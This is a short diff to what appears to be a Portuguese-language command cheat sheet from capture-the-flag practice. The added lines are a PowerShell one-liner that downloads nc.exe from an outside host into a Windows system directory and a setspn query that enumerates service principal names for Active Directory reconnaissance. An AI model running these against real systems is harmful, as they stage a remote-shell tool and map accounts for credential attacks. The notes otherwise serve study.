@@ -166,6 +166,10 @@ cat /home/garry/flag29 | sed "s/\s//g" | tr -d "\n" | rev | cut -d "," -f1 | rev
 
 /etc/group  #é onde se localizam os grupos do sistema linux
 
+powershell -c "(new-object System.Net.WebClient).Downloadfile('http://10.8.1.234:8000/nc.exe', 'C:\Windows\System32\spool\drivers\color\nc.exe')"  #Exemplo de como baixar arquivos da web via powershell
+
+setspn -T medin -Q */*   #detectar spn em usuários, serviço de mapeamento entre o serviço e a conta
+
 
 
 
